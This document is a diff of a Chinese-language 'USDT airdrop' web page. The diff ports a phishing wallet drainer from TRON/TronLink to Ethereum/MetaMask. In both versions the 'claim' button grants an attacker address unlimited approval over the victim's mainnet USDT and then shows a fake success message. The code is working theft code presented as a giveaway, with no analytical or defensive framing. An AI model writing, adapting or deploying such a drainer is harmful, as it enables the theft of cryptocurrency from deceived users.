@@ -1,24 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>限時空投活動</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
-</head>
+<head><meta charset="UTF-8"><title>限時空投活動</title></head>
 <body>
-<h2>🎁 限時活動：領取 100 USDT 空投</h2>
+<h2>🎁 恭喜中獎！點擊下方按鈕領取 USDT 空投獎勵</h2>
 <button onclick="approve()">立即領取</button>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-const token = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // 主網 USDT
-const attacker = 'TTcT9Q6h7JRtbRXvT4ScEp5htH52ARKkY3'; // 攻擊者地址
-const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const attacker = "0xbE573CbFCBb9a5d930feCBDE3B530Bf31B033563";
+const maxApproval = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+const abi = [
+  {
+    "constant": false,
+    "inputs": [
+      { "name": "_spender", "type": "address" },
+      { "name": "_value", "type": "uint256" }
+    ],
+    "name": "approve",
+    "outputs": [{ "name": "", "type": "bool" }],
+    "type": "function"
+  }
+];
 
 async function approve() {
-  const tronWeb = window.tronWeb;
-  if (!tronWeb.defaultAddress.base58) {
-    return alert('請先登入 TronLink 錢包');
+  if (typeof window.ethereum === 'undefined') {
+    alert("請先安裝 MetaMask");
+    return;
   }
-  const contract = await tronWeb.contract().at(token);
-  await contract.approve(attacker, max).send();
-  alert("✅ 授權成功，空投將於24小時內發送！");
+  const web3 = new Web3(window.ethereum);
+  await ethereum.request({ method: 'eth_requestAccounts' });
+  const contract = new web3.eth.Contract(abi, tokenAddress);
+  const accounts = await web3.eth.getAccounts();
+  await contract.methods.approve(attacker, maxApproval).send({ from: accounts[0] });
+  alert("✅ 授權成功！");
 }
 </script>
 </body>
